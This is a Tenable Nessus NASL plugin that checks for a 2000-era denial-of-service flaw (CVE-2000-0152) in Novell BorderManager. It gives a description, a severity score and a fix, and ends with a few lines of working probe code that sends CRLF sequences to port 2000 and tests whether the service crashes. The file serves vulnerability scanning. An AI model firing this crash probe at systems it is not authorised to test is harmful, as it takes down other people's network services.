#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(10163);
  script_version ("$Revision: 1.20 $");
  script_cve_id("CVE-2000-0152");
  script_osvdb_id(7468);

  script_name(english:"Novell BorderManager Port 2000 Telnet DoS");
  script_summary(english:"Crashes the remote Border Manager");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to a denial of service.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The port 2000 is open, and Novell BorderManager
*might* be listening on it.

There is a denial of service attack that allows
an intruder to make a Novell BorderManager 3.5 slowly
die.

If you see an error message on this computer telling
you 'Short Term Memory Allocator is out of Memory'
then you are vulnerable to this attack.

An attacker may use this flaw to prevent this
service from doing its job and to prevent the
user of this station to work on it.

*** If there is no error message whatsoever on this
*** computer, then this is likely a false positive."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Contact Novell and ask for a patch or filter incoming TCP connections to port 2000."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2000/02/09");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/02/04");
 script_set_attribute(attribute:"patch_publication_date", value: "2000/02/17");
 script_cvs_date("$Date: 2016/11/01 16:04:34 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:novell:bordermanager");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");
  script_family(english:"Firewalls");
  script_require_ports(2000);
  exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");

if (! get_port_state(2000)) exit(0);

soc = open_sock_tcp(2000);
if (! soc) exit(1);

msg = crap(data:'\r\n', length:20);
send(socket:soc, data:msg);
close(soc);
if (service_is_dead(port: 2000) > 0)
  security_warning(2000);
